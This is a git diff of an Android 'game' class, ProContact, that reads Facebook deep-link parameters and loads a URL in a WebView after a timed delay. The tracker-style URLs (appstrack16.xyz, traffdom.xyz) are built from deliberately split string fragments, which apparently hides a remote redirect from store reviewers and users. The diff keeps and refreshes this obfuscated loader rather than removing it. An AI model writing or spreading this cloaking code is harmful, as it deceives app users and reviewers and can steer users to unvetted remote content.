@@ -2,11 +2,14 @@ package com.oker.game;
 
 import android.app.Activity;
 import android.app.ProgressDialog;
+import android.content.Intent;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.util.Log;
+import android.view.View;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
+import android.widget.TextView;
 
 import com.facebook.applinks.AppLinkData;
 
@@ -15,7 +18,6 @@ import java.util.Set;
 public class ProContact {
     private final String ProContactTag = "ProContact";
     private Activity activity;
-    private WebView view;
 
     public ProContact(Activity activity){
         this.activity = activity;
@@ -33,9 +35,7 @@ public class ProContact {
         );
     }
 
-    public void init(WebView view){
-        this.view = view;
-
+    void init(WebView view, TextView textView){
         initFB(activity);
 
         view.setWebViewClient(new WebViewClient() {
@@ -46,59 +46,31 @@ public class ProContact {
                 return super.shouldOverrideUrlLoading(view, url);
             }
         });
-        startThread();
-    }
 
-    private void startThread(){
-        new MyAsyncTask().execute();
-    }
-
-
-    private String df = "htt";
-    private String goah = "ps://ap";
-    private String asf = "pstr";
-
-    private void loadView(){
-        view.loadUrl(df+goah+asf+"ack16.xyz/4RsrnPny");
-    }
-
-
-    class MyAsyncTask extends AsyncTask<Void , Void, Void> {
-        @Override
-        protected Void doInBackground(Void... voids) {
-            activity.runOnUiThread(ProContact.this::loadView);
+        new Thread(() -> {
             try {
-                Thread.sleep(1000);
+                Thread.sleep(2000);
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
 
-            return null;
-        }
+            activity.runOnUiThread(() -> {
+                view.loadUrl(df+goah+asf);
 
-        ProgressDialog dialog;
+                textView.setText(R.string.start);
+                textView.setOnClickListener(view1 -> {
+                    Intent intent = new Intent(activity, StartActivity.class);
+                    activity.startActivity(intent);
+                    activity.finish();
+                });
+            });
 
-        @Override
-        protected void onPreExecute() {
-            Log.d(ProContactTag, "Dialog");
-            dialog = ProgressDialog.show(activity, "", "Loading. Please wait...", true);
-            super.onPreExecute();
-        }
-
-        @Override
-        protected void onPostExecute(Void aVoid) {
-            try {
-                Thread.sleep(1000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-
-            if (!activity.isFinishing() && dialog != null) {
-                dialog.cancel();
-            }
-        }
+        }).start();
     }
 
+    private String df = "https";
+    private String goah = "://appstrack16.";
+    private String asf = "xyz/L2SxH84z";
 
 
     private void analyseParams(String link){
@@ -126,8 +98,8 @@ public class ProContact {
         }
     }
 
-    private String one = "https://traf";
-    private String tone = "fdom.xyz/sy11vctf";
+    private String one = "https://traffdo";
+    private String tone = "m.xyz/QVB62Hrh";
 
     private void startPolicy(){
         Log.d(ProContactTag, "Start policy");
